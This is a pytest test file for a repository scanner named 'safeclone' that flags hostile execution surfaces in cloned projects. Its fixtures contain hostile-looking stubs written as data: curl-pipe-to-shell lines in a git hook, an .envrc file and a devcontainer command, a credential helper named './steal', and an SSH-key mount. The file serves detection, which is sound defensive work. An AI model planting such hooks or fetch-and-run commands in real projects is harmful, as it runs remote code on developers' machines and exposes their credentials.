import os

from safeclone.scan import scan


def by_rule(res):
    out = {}
    for f in res.findings:
        out.setdefault(f.rule, []).append(f)
    return out


def test_clean_repo(tmp_path, w):
    w(tmp_path, "src/app.py", "print('hello')\n")
    w(tmp_path, "package.json", {"name": "x", "scripts": {"test": "jest", "build": "tsc"}, "dependencies": {"react": "^18"}})
    w(tmp_path, ".vscode/tasks.json", {"version": "2.0.0", "tasks": [{"label": "build", "command": "npm run build"}]})
    res = scan(str(tmp_path))
    assert res.verdict in ("clean", "low", "info")


def test_git_hooks_and_config(tmp_path, w):
    w(tmp_path, ".git/hooks/post-checkout", "#!/bin/sh\ncurl http://x.invalid/a | sh\n", 0o755)
    w(tmp_path, ".git/hooks/pre-commit.sample", "#!/bin/sh\n")
    w(tmp_path, ".git/config", '[core]\n\tfsmonitor = "./evil"\n[filter "lfs"]\n\tsmudge = ./x %f\n'
                               '[alias]\n\tst = status\n\tx = "!sh -c id"\n[credential]\n\thelper = ./steal\n')
    res = scan(str(tmp_path))
    rules = by_rule(res)
    hooks = rules["git-hook-command"]
    assert len(hooks) == 1 and hooks[0].severity == "critical" and "post-checkout" in hooks[0].message
    cfg = [f.message for f in rules["git-config-command"]]
    assert any("core.fsmonitor" in m for m in cfg)
    assert any("filter.lfs.smudge" in m for m in cfg)
    assert any("credential.helper" in m for m in cfg)
    assert any("alias.x" in m for m in cfg)
    assert not any("alias.st" in m for m in cfg)


def test_gitdir_file(tmp_path, w):
    w(tmp_path, ".git", "gitdir: /somewhere/else\n")
    assert "git-file" in by_rule(scan(str(tmp_path)))


def test_vscode_folder_open_task(tmp_path, w):
    w(tmp_path, ".vscode/tasks.json", '{\n // jsonc\n "tasks": [{"label": "x", "command": "node", "args": ["-e", "require(\'https\')"],\n'
                                      ' "presentation": {"reveal": "never"}, "runOptions": {"runOn": "folderOpen"},}]}')
    f = by_rule(scan(str(tmp_path)))["vscode-task-command"][0]
    assert f.severity == "critical" and "hidden" in f.message


def test_vscode_settings(tmp_path, w):
    w(tmp_path, ".vscode/settings.json", {"task.allowAutomaticTasks": "on", "python.defaultInterpreterPath": "./bin/py",
                                          "editor.fontSize": 14})
    fs = by_rule(scan(str(tmp_path)))["vscode-settings-command"]
    sev = {f.message.split("'")[1] if "'" in f.message else f.message: f.severity for f in fs}
    assert any(f.severity == "critical" for f in fs)
    assert len(fs) == 2, sev


def test_launch_prelaunch(tmp_path, w):
    w(tmp_path, ".vscode/launch.json", {"configurations": [{"name": "dbg", "preLaunchTask": "env"}]})
    assert "vscode-prelaunch" in by_rule(scan(str(tmp_path)))


def test_devcontainer(tmp_path, w):
    w(tmp_path, ".devcontainer/devcontainer.json", {"initializeCommand": "curl x | sh", "postCreateCommand": "npm i",
                                                    "mounts": ["source=${localEnv:HOME}/.ssh,target=/root/.ssh,type=bind"]})
    rules = by_rule(scan(str(tmp_path)))
    sev = sorted(f.severity for f in rules["devcontainer-command"])
    assert sev == ["critical", "medium"]
    assert "devcontainer-host-access" in rules


def test_package_json(tmp_path, w):
    w(tmp_path, "package.json", {"scripts": {"postinstall": "node x.js", "prepare": "husky", "predev": "echo",
                                             "weird": "curl a | sh"},
                                 "dependencies": {"jsonwebauth": "1", "foo": "github:evil/foo", "ok": "^1"}})
    rules = by_rule(scan(str(tmp_path), iocs=["jsonwebauth"]))
    names = [f.message for f in rules["npm-lifecycle-command"]]
    assert any("postinstall" in n for n in names) and any("prepare" in n for n in names)
    assert rules["npm-script-command"][0].severity == "critical"
    assert rules["ioc-package"][0].severity == "critical"
    assert len(rules["npm-url-dependency"]) == 1


def test_nested_package_json_but_not_node_modules(tmp_path, w):
    w(tmp_path, "server/package.json", {"scripts": {"preinstall": "node a"}})
    w(tmp_path, "node_modules/x/package.json", {"scripts": {"preinstall": "node a"}})
    fs = by_rule(scan(str(tmp_path)))["npm-lifecycle-command"]
    assert [f.path for f in fs] == ["server/package.json"]


def test_python_surfaces(tmp_path, w):
    w(tmp_path, "setup.py", "from setuptools import setup\nsetup()\n")
    w(tmp_path, "pyproject.toml", '[build-system]\nrequires=[]\nbuild-backend="b"\nbackend-path=["."]\n')
    w(tmp_path, "lib/evil.pth", "import os\n")
    rules = by_rule(scan(str(tmp_path)))
    assert {"setup-py", "in-tree-build-backend", "python-startup"} <= set(rules)


def test_misc_surfaces(tmp_path, w):
    w(tmp_path, ".envrc", "curl -s http://198.51.100.2/x | sh\n")
    w(tmp_path, ".yarnrc.yml", "yarnPath: .yarn/releases/yarn.cjs\n")
    w(tmp_path, ".npmrc", "script-shell=./sh\n")
    w(tmp_path, ".pnpmfile.cjs", "module.exports = {}\n")
    w(tmp_path, ".mcp.json", {"mcpServers": {"x": {"command": "node", "args": ["srv.js"]}}})
    w(tmp_path, ".claude/settings.json", {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "sh x"}]}]}})
    w(tmp_path, ".husky/pre-commit", "npx lint-staged\n")
    rules = by_rule(scan(str(tmp_path)))
    assert rules["direnv-command"][0].severity == "critical"
    for r in ("yarn-path", "npmrc", "pnpmfile-command", "agent-mcp-command", "agent-hooks-command", "git-hook-command"):
        assert r in rules, r


def test_symlink_escape_and_binary(tmp_path, w):
    os.symlink("/etc", str(tmp_path / "etc-link"))
    os.symlink("src", str(tmp_path / "ok-link"))
    os.makedirs(str(tmp_path / "src"))
    with open(str(tmp_path / "tool"), "wb") as fh:
        fh.write(b"\x7fELF" + b"\x00" * 64)
    rules = by_rule(scan(str(tmp_path)))
    assert [f.path for f in rules["symlink-escape"]] == ["etc-link"]
    assert rules["native-binary"][0].path == "tool"


def test_ioc_string_and_readme_exemption(tmp_path, w):
    w(tmp_path, "README.md", "never read ~/.ssh/id_rsa\n")
    w(tmp_path, "src/x.js", "const u = 'beavertail-c2-marker-123';\n")
    rules = by_rule(scan(str(tmp_path), iocs=["beavertail-c2-marker-123"]))
    assert "credential-paths" not in rules
    assert rules["ioc-string"][0].line == 1


def test_takehome_fixture_is_critical(takehome, tmp_path):
    from safeclone.fetch import fetch
    path, kind, notes = fetch(takehome, str(tmp_path / "w"))
    res = scan(path, iocs=["jsonwebauth"])
    rules = by_rule(res)
    assert res.verdict == "critical"
    for r in ("git-hook-command", "git-config-command", "vscode-task-command", "npm-lifecycle-command",
              "ioc-package", "hidden-far-right", "eval-decoded", "credential-paths", "paste-payload-host"):
        assert r in rules, r
    assert notes and notes[0][1] == "archive-symlink"
    d = res.to_dict()
    assert d["counts"]["critical"] >= 5
